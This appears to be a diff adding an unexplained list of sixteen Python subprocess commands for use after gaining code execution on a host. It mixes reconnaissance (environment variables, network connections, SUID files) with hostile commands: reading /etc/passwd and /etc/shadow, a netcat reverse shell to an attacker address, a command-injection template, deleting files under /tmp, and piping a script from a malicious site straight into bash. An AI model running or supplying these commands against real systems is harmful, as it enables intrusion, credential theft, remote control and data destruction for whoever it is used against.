@@ -1,0 +1,47 @@
+1. List Files in the Current Directory:
+subprocess.getoutput('ls -la')
+
+2. Print the Current User:
+subprocess.getoutput('whoami')
+
+3. Display the System’s Environment Variables:
+subprocess.getoutput('env')
+
+4. Show System Information:
+subprocess.getoutput('uname -a')
+
+5. Read Sensitive Files (passwd):
+subprocess.getoutput('cat /etc/passwd')
+
+6. Read Sensitive Files (shadow):
+subprocess.getoutput('cat /etc/shadow')
+
+7. Network Information (IP Addresses):
+subprocess.getoutput('ifconfig')
+
+8. Show Active Network Connections:
+subprocess.getoutput('netstat -tulnp')
+
+9. Download a File from the Web (Example using curl):
+subprocess.getoutput('curl http://example.com/file.txt -o /tmp/file.txt')
+
+10. Execute a Reverse Shell (Dangerous):
+subprocess.getoutput('nc -e /bin/bash attacker_ip 1234')
+
+11. Check the System’s Disk Usage:
+subprocess.getoutput('df -h')
+
+12. Process List (List Running Processes):
+subprocess.getoutput('ps aux')
+
+13. Find All Files with SUID/SGID Bits Set:
+subprocess.getoutput('find / -type f -perm /4000')
+
+14. Execute Arbitrary Commands (Command Injection):
+subprocess.getoutput('$(<command>)')
+
+15. Remove All Files in a Directory (Warning: Very Dangerous!):
+subprocess.getoutput('rm -rf /tmp/*')
+
+16. Download and Execute Malicious Payload:
+subprocess.getoutput('curl -s http://malicious-site.com/malicious-script.sh | bash')
